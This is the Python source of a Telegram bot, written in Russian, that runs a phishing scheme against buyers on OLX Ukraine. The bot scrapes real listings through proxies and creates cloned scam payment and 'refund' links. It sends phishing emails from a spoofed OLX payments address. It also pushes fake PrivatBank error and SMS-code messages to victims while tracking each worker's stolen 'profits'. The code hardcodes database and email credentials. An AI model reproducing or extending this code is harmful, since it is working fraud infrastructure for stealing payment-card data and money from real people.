
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.executor import start_polling
# from aiogram.utils.exceptions import Throttled
from aiogram.dispatcher import Dispatcher
from aiogram import Bot, types
from bs4 import BeautifulSoup as bs
import requests
import datetime
import aiohttp
import asyncio
import logging
# import aiohttp
import asyncpg
import random
import sqlite3
import cfg
import sys
import re
import os

from functools import partial
from mailer import *

from utils import TestStates
# from messages import MESSAGES
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(format=u'%(filename)+13s [ LINE:%(lineno)-4s] %(levelname)-8s [%(asctime)s] %(message)s',
                    level=logging.INFO)

loop = asyncio.get_event_loop()

bot = Bot(token=cfg.token)

btns_text = ('🏴‍☠️ Кабинет', '🔏 Ссылки', '✒️ Редакт. цену', '🃏 Чат', '🔲 Удалить', '🔗 Создать ссылку', '⭐ Выплаты', '⚫️ Отменить')
keyboard_markup = ReplyKeyboardMarkup(row_width=4).add(*(types.KeyboardButton(text) for text in btns_text))

storage = MemoryStorage()
dp = Dispatcher(bot, storage=MemoryStorage())
dp.middleware.setup(LoggingMiddleware())
new_users = {}


class NewUser:
    def __init__(self, user_id, username):
        self.id = user_id
        self.username = username
        self.question = 1
        self.where_from = ""
        self.experience = ""
        self.time = ""
        self.comment = ""
        self.form = ""

        self.sent = False
        self.blocked = False

async def on_startup(dp):

    dp.database = await asyncpg.create_pool(user='admin_olx',database='admin_olx', host='185.161.209.19', password='AU5oLo8R1y')

def hide_name(name):
 
    return f"{name[:round(len(name) / 2)]}{'*' * round(len(name) - round(len(name) / 2))}"

@dp.message_handler(commands='start')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def startcmd(message: types.Message):

    if message.chat.type != "private": return

    async with dp.database.acquire() as conn:

        rows = await conn.fetch("SELECT username, ban FROM workers where userid = $1",str(message.from_user.id))
        if not rows:

            await conn.execute("INSERT INTO workers (userid,username) VALUES ($1, $2);", str(message.from_user.id),message.from_user.username)
            rows = await conn.fetch("SELECT username, ban FROM workers where userid = $1",str(message.from_user.id))

        if rows and rows[0][1] == 0:
            if str(rows[0][0]) != message.from_user.username:
                await conn.execute("UPDATE workers SET username = $1 WHERE userid = $2;", message.from_user.username, str(message.from_user.id))
                await dp.database.release(con)


                await message.reply(f"🏴‍☠️ Твоё пиратское имя было изменено! 🏴‍☠️", reply_markup=keyboard_markup)

        else:

            await conn.execute("INSERT INTO workers (userid,username) VALUES ($1, $2);", str(message.from_user.id),message.from_user.username)
    
    await dp.database.release(conn)

    chat_member = await bot.get_chat_member(cfg.chats[0], message.from_user.id)

    if chat_member.status == "left" and rows[0][1] == 0:

        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(types.InlineKeyboardButton('Войти на палубу! ☠️', callback_data='new_user'))
        return await message.reply("Привет, юный захватчик Карибских морей! 🏴‍☠️", reply_markup=keyboard)

    await message.reply(f"🏴‍☠️ Рады видеть тебя снова, юный пират {message.from_user.username}! 🏴‍☠️🏴‍☠️", reply_markup=keyboard_markup)


@dp.message_handler(commands='рассылка')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def rassylka(message: types.Message):
    if message.from_user.id in cfg.admins: 

        async with dp.database.acquire() as con:

            rows = await con.fetch('SELECT userid FROM workers;')
            string = ''
            n = 0
            for row in rows:
                try:
                    await bot.send_message(row['userid'], message.text.replace("/рассылка ", ""))
                    n += 1
                except:
                    pass
            await bot.send_message(message.from_user.id, '🏴‍☠️ Успешно разослано ' + str(n) + ' раз')
        
        await dp.database.release(con)


@dp.message_handler(commands='makecheck')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def makecheck(message: types.Message):

    if message.from_user.id in cfg.admins:
        await bot.send_message(message.chat.id, '🏴‍☠️ Начинаем писать чек юзеру ! 🏴‍☠️')
        msg = message.text.replace("/makecheck ", "")

        async with dp.database.acquire() as con:

            username = msg.split(' ')[0]
            price = msg.split(' ')[1]
            userid = await con.fetchval(f"SELECT userid  FROM workers where username = $1;", username)
            if userid:
                balance = await con.fetchval(f"SELECT balance  FROM workers WHERE userid=$1;", userid)
                zaletov = await con.fetchval(f"SELECT zaletov  FROM workers WHERE userid=$1;", userid)

                string = ''

                await con.execute(
                    f"UPDATE workers SET balance=$1 WHERE userid=$2", int(balance) + int(price), userid)
                await con.execute(f"UPDATE workers SET zaletov=$1 WHERE userid=$2", int(zaletov) + 1, userid)
                await con.execute(
                    f"INSERT INTO zalety (worker,price,name) VALUES ($1,$2, $3)", username, price, userid)

                await bot.send_message(cfg.chats[0],
                                        "💰<b>Успешная оплата!</b> \n🛠<b>Воркер:</b> @" + msg.split(' ')[
                                            0] + "\n💸<b>Сумма: " + msg.split(' ')[1] + "</b> грн. !",
                                        parse_mode='HTML')
                    
            else:
                await bot.send_message(message.chat.id,
                                       f"🏴‍☠️🏴‍☠️ Юзера {username} нету в базе, пусть юзер пропишет /start 🏴‍☠️")

        await dp.database.release(con)


@dp.message_handler(commands='kick')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def kick_member(message: types.Message):
    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:

            user_id = await con.fetchval(f"SELECT userid  FROM workers where username = $1", message.text.replace('/kick ', ''))
            kick_message = await random.choice(cfg.kick_message)

            await bot.send_message(int(user_id), "Ты " + kick_message)
            await bot.send_message(cfg.chats[0], message.text.replace('/kick ', '') + " " + kick_message)
            await bot.send_message(message.from_user.id, "Готово!")
            await bot.kick_chat_member(cfg.chats[0], int(user_id))
        
        await dp.database.release(con)

    else:

        await bot.send_message(message.chat.id, "🏴‍☠️ Доступа у тебя нема!")


@dp.message_handler(commands='ban')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def ban_message(message: types.Message):
    if message.from_user.id in cfg.admins:

        user_id = None

        async with dp.database.acquire() as con:

            user_id = await con.fetchval(f"SELECT userid  FROM workers WHERE username = $1", message.text.replace('/ban ', ''))
            await con.execute(f"UPDATE workers SET ban=1 WHERE userid = $1", user_id)

        await dp.database.release(con)

        await bot.send_message(int(user_id), "🏴‍☠️🏴‍☠️ Ты забанин!")
        await bot.send_message(message.from_user.id, "🏴‍☠️ Готово!")

    else:
        await bot.send_message(message.chat.id, "🏴‍☠️ Доступа у тебя нема!")

@dp.message_handler(commands='mail')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def mail(message: types.Message):
    
    ctx = message.text.strip().replace("/mail", "").split()

    pochta = idobyavi = pokupatel = None

    try:

        pochta = ctx[0]
        idobyavi = int(ctx[1])
        pokupatel = ctx[2]

    except Exception as e:

        return await message.reply(f"/mail pochta@gmail.com idobyavleniya imyapokupatelya //// {e}")

    async with dp.database.acquire() as con:

        itemid = await con.fetchval("SELECT item FROM links WHERE id = $1", idobyavi)
        tovar = await con.fetchval("SELECT tovarN FROM links WHERE id = $1", idobyavi)

    await dp.database.release(con)

    if (itemid == None) or (tovar == None):

        return await message.reply("Некорректно указано id обьявления")

    scamlnk = f"https://{cfg.domain}/?item_id={itemid}"

    try:

        result = await dp.loop.run_in_executor(
            
            None,
            partial(
                
                send,
                pochta, 
                "payments.olx.ua@gmail.com", 
                "P455w0rd", 
                scamlnk, 
                pokupatel, 
                tovar.strip()

            )

        )

        await message.reply("Успешно отправлено мамонту! Жди залета!!!")

    except Exception as e:

        await message.reply(f"Ошибка отправки: {e}")

@dp.message_handler(commands='refund')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def refund(message: types.Message):
    
    ctx = message.text.strip().replace("/refund", "").split()

    pochta = idobyavi = pokupatel = None

    try:

        pochta = ctx[0]
        idobyavi = int(ctx[1])
        pokupatel = ctx[2]

    except Exception as e:

        return await message.reply(f"/refund pochta@gmail.com idobyavleniya imyapokupatelya //// {e}")

    async with dp.database.acquire() as con:

        itemid = await con.fetchval("SELECT item FROM links WHERE id = $1", idobyavi)
        tovar = await con.fetchval("SELECT tovarN FROM links WHERE id = $1", idobyavi)

    await dp.database.release(con)

    if (itemid == None) or (tovar == None):

        return await message.reply("Некорректно указано id обьявления")

    scamlnk = f"https://{cfg.domain}/?item_id={itemid}.html&refund"

    try:

        result = await dp.loop.run_in_executor(
            
            None,
            partial(
                
                vozvrat,
                pochta, 
                "payments.olx.ua@gmail.com", 
                "P455w0rd", 
                scamlnk, 
                pokupatel, 
                tovar.strip()

            )

        )

        await message.reply("Успешно отправлено мамонту (возврат)! Жди залета х2!!!")

    except Exception as e:

        await message.reply(f"Ошибка отправки: {e}")

@dp.message_handler(commands='unban')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def unban_member(message: types.Message):
    if message.from_user.id in cfg.admins:

        user_id = None

        async with dp.database.acquire() as con:

            user_id = await con.fetchval(f"SELECT userid  FROM workers WHERE username = $1", message.text.replace('/unban ', ''))
            await con.execute(f"UPDATE workers SET ban=0 WHERE userid = $1", user_id)
        
        await dp.database.release(con)

        await bot.send_message(int(user_id), "🏴‍☠️🏴‍☠️ Ты раз забанин!")
        await bot.send_message(message.from_user.id, "🏴‍☠️🏴‍☠️ Готово!")

    else:

        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Доступа у тебя нема!")


@dp.message_handler(commands='send')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def send_message(message: types.Message):
    if message.from_user.id in cfg.admins:
        text = re.match(r'(\d*) (.*)', message.text.replace('/send ', ''))
        await bot.send_message(int(text.group(1)), text.group(2))
        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Готово!")
    else:
        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Доступа у тебя не ма!")


@dp.message_handler(commands='addproxy')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def add_proxy(message: types.Message):
    if message.from_user.id in cfg.admins:
        proxy = re.match(r'(\w*):\/\/(\w*):(\w*)@(\w.*):(\d*)', message.text.replace('/addproxy ', ''))

        async with dp.database.acquire() as con:

            await con.execute(
                "INSERT INTO proxys (type, proxy_user, password, ip, port) VALUES ($1, $2, $3, $4, $5)",
                proxy.group(1), proxy.group(2), proxy.group(3), proxy.group(4), proxy.group(5)
            )
        
        await dp.database.release(con)
        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Готово!")

    else:

        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Доступа у тебя нема!")


@dp.message_handler(commands='proxys')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def add_proxy(message: types.Message):

    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:
            text = ""
            rows = await con.fetch("SELECT *  FROM proxys")
            for row in rows:
                text+=f"<b>{row[0]}</b>: <code>{row[1]}://{row[2]}:{row[3]}@{row[4]}:{row[5]}</code>\n"

            await bot.send_message(message.chat.id, text, parse_mode='HTML')
        
        await dp.database.release(con)

    else:
        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Доступа у тебя нема!")


@dp.message_handler(commands='help')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def help(message: types.Message):

    if message.from_user.id in cfg.admins:
        await bot.send_message(message.chat.id, cfg.help, parse_mode='HTML')
    else:
        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Доступа у тебя нема!")


@dp.message_handler(commands='keyboard')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def keyboard_send(message: types.Message):
    await bot.send_message(message.from_user.id, "🏴‍☠️🏴‍☠️ Получи своё морское меню! 🏴‍☠️🏴‍☠️", reply_markup=keyboard_markup)


@dp.message_handler(commands='info')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def info(message: types.Message):
    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:

            rows = await con.fetch("SELECT *  FROM workers WHERE username=$1", message.text.replace('/info ', ''))

            id = rows[0][0]
            userid = rows[0][1]
            username = rows[0][2]
            balance = rows[0][3]
            ban = rows[0][4]
            zaletov = rows[0][5]

            await bot.send_message(message.chat.id, f"id: {id}\nuserid: {userid}\nusername: {username}\nbalance: {balance}\n"
                                                    f"ban: {ban}\nzaletov: {zaletov}")

        await dp.database.release(con)

    else:

        await bot.send_message(message.chat.id, "🏴‍☠️ Доступа у тебя нема!")


@dp.message_handler(commands='delproxy')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def del_proxy(message: types.Message):
    if message.from_user.id in cfg.admins:

        async with dp.database.acquire() as con:

            rows = await con.execute("DELETE FROM proxys WHERE id=$1", int(message.text.replace('/delproxy ', '')))
            await bot.send_message(message.chat.id, "Готово!", parse_mode='HTML')

        await dp.database.release(con)

    else:

        await bot.send_message(message.chat.id, "🏴‍☠️🏴‍☠️ Доступа у тебя нема!")

@dp.message_handler(commands='accept')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def accepttt(message: types.Message):

    if message.from_user.id in cfg.admins:

        try:

            cont = int(message.text.strip().replace("/accept", "").strip())

        except:

            return await message.reply("Введите нормальный айди")

        try:

            mmb = await bot.get_chat_member(cont, cont)
            await bot.send_message(mmb.user.id, "Вы были приняты в ряды пиратов! 🏴‍☠️")
            await message.reply("Принят нахуй")

        except Exception as e:

            await message.reply(e)

        try:

            del new_users[mmb.user.id]

        except: pass
        
    else: await bot.send_message(message.from_user.id, "🏴‍☠️ нема доступа :)")

@dp.message_handler(commands='status')
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def statuss(message: types.Message):
    if message.from_user.id in cfg.admins:

        if '-' in message.text:
            idmam = message.text.strip().replace("/status ", '').split('-')[0]
            iderr = message.text.strip().replace("/status ", '').split('-')[1]
            status = ""
            link = 'no'
            texttoworker = ""
            if iderr == "1":
                status = "Неверный формат примечания. Пожалуйста, повторите попытку"
                texttoworker = "Успешная оплата"
            elif iderr == "2":
                status = "Ошибка. Проверьте лимит на интернет покупки в личном кабинете своего банка, после чего повторите попытку."
                texttoworker = "Лимит"
            elif iderr == "3":
                status = "Недостаточно средств. Пополните баланс и повторите попытку."
                texttoworker = "Недостаточно средств"
            elif iderr == "4":
                status = "Разблокируйте операцию в мобильном приложении: раздел Онлайн помощь > Не проходит оплата в интернете. После чего повторите оформление заказа."
                texttoworker = "Разблокируйте операцию в мобильном приложении"
            elif iderr == "5":
                status = "Пожалуйста, проверьте наличие SMS от ПриватБанка о подтверждении платежа. Необходимо подтвердить платёж и повторить попытку оформления."
                texttoworker = "Пожалуйста, проверьте наличие SMS от ПриватБанка"
            elif iderr == "6":
                status = "Неверный смс-код. Повторите попытку."
                texttoworker = "Неверный смс-код"
            elif "link " in iderr:
                status = "Ждите редирект на страницу оплаты."
                link = re.findall(r"(https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|www\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|https?:\/\/(?:www\.|(?!www))[a-zA-Z0-9]+\.[^\s]{2,}|www\.[a-zA-Z0-9]+\.[^\s]{2,})", message.text)[0]
                async with dp.database.acquire() as con:
                    await con.execute("UPDATE status SET link = $1 WHERE ip = $2;", link, idmam)
                await dp.database.release(con)

                texttoworker = "🔥 Мамонт на странице оплаты. Ждем профит"
            elif 'privat24.ua' in iderr:
                status = iderr
                texttoworker = "Приват ща улетит"
            else:
                status = iderr
                texttoworker = iderr
            status = status.encode().decode()

            async with dp.database.acquire() as con:
                await con.execute("UPDATE status SET status = $1 WHERE ip = $2;", status, idmam)
            await dp.database.release(con)

            await bot.send_message(message.chat.id, '[' + idmam + "]  " + status)
        

            try:

                async with dp.database.acquire() as con:

                    rows = await con.fetch("SELECT worker FROM status WHERE ip = $1;", idmam)
                    # for row in rows:
                    await bot.send_message(cfg.chats[0], '📃@' + rows[0][0] + "  " + texttoworker)

                await dp.database.release(con)

            except Exception as e:

                await message.reply(e)


@dp.message_handler(state=TestStates.TEST_STATE_1)
async def first_test_state_case_met(message: types.Message):
    if '⚫️ Отменить' in message.text:
        state = dp.current_state(user=message.from_user.id)
        await message.reply('<b>🏴‍☠️ Действие отменено!</b>', parse_mode='HTML')
        return await state.reset_state()
    if (message.text.isdigit()):
        await message.reply(
            '<b>🏴‍☠️ Ты отправил мне ID</b> = <code>' + message.text + '</code>\n🏴‍☠️ Укажи новую цену!',
            parse_mode='HTML')
        state = dp.current_state(user=message.from_user.id)
        await state.update_data(priceedit=message.text)
        await state.set_state(TestStates.all()[2])
    else:
        await message.reply('<b>🏴‍☠️ Неккорректное указание id объявления !</b>', parse_mode='HTML')


@dp.message_handler(state=TestStates.TEST_STATE_2[0])
async def second_test_state_case_met(message: types.Message):
    if '⚫️ Отменить' in message.text:
        state = dp.current_state(user=message.from_user.id)
        await message.reply('<b>🏴‍☠️ Действие отменено!</b>', parse_mode='HTML')
        return await state.reset_state()
    if message.text.isdigit():
        state = dp.current_state(user=message.from_user.id)
        user_data = await state.get_data()
        async with dp.database.acquire() as con:
            rows = await con.fetch("SELECT userr, item FROM links WHERE id = $1", int(user_data['priceedit']))
            if (rows):
                for row in rows:
                    print(row[0] + " ==  " + str(message.from_user.id))
                    if (row[0] == str(message.from_user.id)):

                        await con.execute(
                            f"UPDATE links SET price = $1 WHERE id = $2;", message.text, int(user_data['priceedit']))
                        await dp.database.release(con)

                        await message.reply('<b>[' + str(user_data[
                                                             'priceedit']) + '] Цена успешно изменена на</b> = <code>' + message.text + '</code>',
                                            parse_mode='HTML')
                        await state.reset_state()
                    else:
                        await message.reply(
                            '<b>🏴‍☠️ Ты пытаешься получить доступ к чужому объявлению !\n🏴‍☠️ Не делай так!</b>',
                            parse_mode='HTML')
            else:
                await message.reply('<b>🏴‍☠️ Не смог найти такое обьявление</b>', parse_mode='HTML')
        # except Exception as e:
        #     exc_type, exc_obj, exc_tb = sys.exc_info()
        #     fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #     print(exc_type, fname, exc_tb.tb_lineno, e)
        #     await message.reply(
        #         '<b>Ошибка при изменении цены </b> (Сообщить @pirate2110)\n <code>' + str(e) + ' ' + str(
        #             exc_tb.tb_lineno) + '</code>', parse_mode='HTML')

        await dp.database.release(con)


    else:
        await message.reply('<b>🏴‍☠️ Неккорректное указана новая цена!</b>', parse_mode='HTML')


@dp.message_handler(state=TestStates.TEST_STATE_3)
async def third_or_fourth_test_state_case_met(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    if ('⚫️ Отменить' in message.text):
        state = dp.current_state(user=message.from_user.id)
        await message.reply('<b>🏴‍☠️ Действие отменено!</b>', parse_mode='HTML')
        return await state.reset_state()
    if (message.text.isdigit()):
        try:
            async with dp.database.acquire() as con:

                rows = await con.fetch('SELECT userr FROM links where id = ' + str(message.text))
                if (rows):
                    for row in rows:
                        if (row[0] == str(message.from_user.id)):

                            await con.execute('DELETE FROM links WHERE id = ' + str(message.text))
                            await bot.send_message(message.from_user.id, '✅ Удалено успешно!')
                            await state.reset_state()

                        else:
                            await bot.send_message(message.from_user.id, '⛔️Ты что-то напутал')
                else:
                    await bot.send_message(message.from_user.id, '⚠️Нет какой объявы')

            await dp.database.release(con)

        except Exception as err:
            print(err)
            await bot.send_message(message.from_user.id, "🏴‍☠️ Не удалось удалить объявление." + str(err))
    else:
        await message.reply('<b>🏴‍☠️ Неккорректное указан id объявления !</b>', parse_mode='HTML')


@dp.message_handler()
@dp.throttled(lambda msg, loop, *args, **kwargs: loop.create_task(
    bot.send_message(msg.from_user.id, "☠️ 🏴‍☠️ хули ты такой быстрый блять, молодой пират?")),
              rate=0.5)
async def all_msg_handler(message: types.Message):

    chatMember = await bot.get_chat_member(cfg.chats[0], message.from_user.id)

    sent = False
    blocked = False

    try:

        sent = new_users[message.from_user.id].sent

    except: pass

    try:

        blocked = new_users[message.from_user.id].blocked
    
    except: pass

    if chatMember.status == "left" and message.chat.type == "private" and sent:

        return await message.reply("🏴‍☠️ Вы уже подали заявку! Ожидайте её одобрения!! 🏴‍☠️🏴‍☠️")

    if blocked and chatMember.status == "left": return await message.reply("🏴‍☠️🏴‍☠️ Отправьте или измените свою заявку перед продолжением! 🏴‍☠️🏴‍☠️")
    
    if chatMember.status == "left" and message.from_user.id not in new_users:
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(types.InlineKeyboardButton('Войти на палубу! ☠️', callback_data='new_user'))
        await message.reply("Привет, юный захватчик Карибских морей! 🏴‍☠️", reply_markup=keyboard)
        return

    if message.chat.type != "private": return
    button_text = message.text

    if button_text == '🔗 Создать ссылку':
        await message.reply("☠️🏴‍☠️ Пришли мне ссылку на объявление!")
    elif button_text == '🔏 Ссылки':
        try:
            links = None
            async with dp.database.acquire() as con:
                links = await con.fetch(
                    f"SELECT link,mainlink,price,tovarN,id,item FROM links WHERE userr = $1;", str(message.from_user.id))
                string = ""
                for row in links:
                    # string += "{0} {1} {2} {3}".format(row[0], row[1], row[2], row[3])
                    # print("{0} {1} {2} {3}".format(row[0], row[1], row[2], row[3]))
                    string += "<b>----------</b><code>[🔑 " +\
                              str(row[4]) + "]</code><b>----------</b>\n<b>🏴‍☠️ Объява</b>: https://"+ \
                              cfg.domain + '/obyavlenie/?i=' + \
                              row[5] + "\n"
                    string += "🏴‍☠️ <b>Оплата</b>: https://" + cfg.domain + '?item_id=' + row[5] + "\n"
                    string += "🤑 <b>Возврат</b>: https://" + cfg.domain + '?item_id=' + row[5] + '&refund' + "\n"
                    string += "💰<b>Цена</b>: <i>" + row[2] + "</i>\n"
                    string += "📌<b>Название</b>: <code>" + row[3] + '</code>\n'

            await dp.database.release(con)

            if len(string) > 4096:
                for x in range(0, len(string), 4096):
                    await bot.send_message(message.from_user.id, string[x:x + 4096], parse_mode='HTML')
            elif len(string) == 0:
                await bot.send_message(message.from_user.id, "☹️Список ссылок для Вас пуст")
            else:
                await bot.send_message(message.from_user.id, string, parse_mode='HTML')
        except Exception as e:
            await message.reply('🏴‍☠️ Не получилось, попробуй чуточку позже' + str(e), parse_mode='HTML')
    elif button_text == '⚫️ Отменить':
        await message.reply('🏴‍☠️ Нечего отменять :)', parse_mode='HTML')
    elif button_text == '🏴‍☠️ Кабинет' or button_text == '/me':
        async with dp.database.acquire() as con:
            rows = await con.fetch(f"SELECT balance,zaletov FROM workers WHERE userid = $1", str(message.from_user.id))
            string = ''
            string += str(
                message.from_user.mention) + f" ({message.from_user.id})\n"

            ot = "никого"

            try:

                ot = str(rows[0][2])

            except: pass
            
            string += "<b>💶 Баланс: </b><i>" + str(rows[0][0]) + " ₴</i>\n"
            string += "<b>🔝 Залетов: </b> " + str(rows[0][1])
        await message.reply(string, parse_mode='HTML')
        await dp.database.release(con)
    elif button_text == '⭐ Выплаты':

        async with dp.database.acquire() as con:

            rows = await con.fetch("SELECT worker,price,date,name FROM zalety WHERE DATE(date) >= CURRENT_DATE AND DATE(date) < CURRENT_DATE + INTERVAL '1 DAY';")
            d2 = datetime.datetime.now()
            string = ""
            allprice = 0

            for row in rows:

                string += f'☠️ _{hide_name(row[0])}_ - **{row[1]}₴**\n'
                allprice += int(row[1])

            await bot.send_message(message.chat.id,
                                '`Сумма всех профитов на сегодняшний день составляет ' + str(allprice) + '₴\n🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️🏴‍☠️ `\n' + string, parse_mode="markdown")
        
        await dp.database.release(con)

    elif 'olx.ua/obyavlenie/' in button_text or 'olx.ua/obyavlene' in button_text:

        req = 1

        rows = await dp.database.fetch("SELECT * FROM proxys")

        for row in rows:
            proxies = {'https': row[1]+"://"+row[2]+":"+row[3]+"@"+row[4]+":"+row[5]}
            try:
                req = requests.get(button_text, proxies=proxies)
                work = True
                await bot.send_message(message.from_user.id, f"🏴‍☠️ Данные получены, обрабатываем!")
                break
            except Exception as e:
                await bot.send_message(message.from_user.id, "proxy "+str(row[0])+": "+str(e))
                await dp.database.execute("DELETE FROM proxys WHERE id = $1", row[0])

        if not rows:

            req = requests.get(button_text)
            work = True
            await bot.send_message(message.from_user.id, f"🏴‍☠️ Данные получены, обрабатываем!")
        
        req.encoding = "utf-8"
        folder = button_text.replace("https://www.olx.ua/obyavlenie/", "")
        
        folder = folder.replace("https://olx.ua/obyavlenie/", "")
        folder = folder.replace("https://www.olx.ua/obyavlene/", "")
        folder = folder.replace("https://olx.ua/obyavlene/", "")

        soup = bs(req.content.decode('utf-8'), 'html.parser')
        nameU = soup.find('div', {'class': 'quickcontact__user-name'}).text
        nameU = nameU.replace("   ", "")
        nameU = nameU.replace('''
                ''', "")
        nameU = nameU.replace('''
            ''', "")

        tovarName = soup.find('div', {'class': 'offer-titlebox'}).find('h1').text
        price = soup.find('div', {'class': 'pricelabel'}).find('strong').text
        price = re.sub(" грн.", "", price)
        price = ''.join(price.split())
        imglist = ''
        n = 0
        for a in soup.findAll('img', {'class': 'vmiddle'}):
            if (n == 0):
                imglist += a['src'].split(';')[0]
            else:
                imglist += '|' + a['src'].split(';')[0]
            n += 1

        btnslist = '<li class="offer-details__item"><a href="https://www.olx.ua/elektronika/telefony-i-aksesuary/mobilnye-telefony-smartfony/ananev_42731/?search%5Bprivate_business%5D=private" class="offer-details__param offer-details__param--url" title="Частного лица - Ананьев"><span class="offer-details__name">Объявление от</span><strong class="offer-details__value">Частного лица</strong></a></li>'
        for a in soup.findAll('li', {'class': 'offer-details__item'}):
            btnslist += str(a)
        location = soup.find('div', {'class': 'offer-user__address'}).find('address').find('p').text
        description = soup.find('div', {'id': 'textContent'}).text
        tovarName = tovarName.lstrip("\n ")

        json = None

        if "$" in price:

            price = float(price.replace("$", "").strip())
            json = None

            async with aiohttp.ClientSession() as cs:

                resp = await cs.get("https://api.privatbank.ua/p24api/pubinfo?exchange&coursid=5&json")
                json = await resp.json()
            
            price = str(round(float(price) * float(json[0]["buy"])))

        deliver = float(price) * float(0.01)

        my_link = 'https://' + cfg.domain + '/?item_id=' + str(folder)

        id = None

        async with dp.database.acquire() as con:

            try:

                await con.execute(f"INSERT INTO links (userr,mainlink,link,price,tovarn, nameu, worker, item, delivery, image, btn, location, decrip) "
                                        f"VALUES ($1, $2, $3, $4 ,"
                                        f"$5, $6, $7, $8, $9,"
                                        f"$10, $11 , $12, $13);",
                                        str(message.from_user.id), str(button_text), "https://"+cfg.domain+"/obyavlenie/?i="+folder,
                                        price, tovarName, nameU, message.from_user.username, folder, str(deliver), imglist,
                                        btnslist, location, description)

            except Exception as e:

                await message.reply(f"🏴‍☠️ Скорее всего, вы уже добавляли это обьявление в бота. Ошибка: {e}")



            id = await con.fetchval("SELECT id FROM links WHERE tovarn=$1", tovarName)

        await dp.database.release(con)

        standart_my_link = my_link.replace("грн.", "")
        refund_my_link = my_link.replace("грн.", "") + '&refund'
        await message.reply('🏴‍☠️ <b>Объявление успешно создано</b> <code>[ID' + str(
            id) + ']: [' + price + '₴]\n' + tovarName + '</code>\n\n🔗Скам-ссылка: https://' + cfg.domain + '/obyavlenie/?i=' + str(
            folder) + '\n\n🔗Оплата: ' + standart_my_link + '\n\n🔗Возврат: ' + refund_my_link,
                            parse_mode='HTML')

    elif button_text == '✒️ Редакт. цену':
        state = dp.current_state(user=message.from_user.id)
        await state.reset_state()
        await state.set_state(TestStates.all()[1])
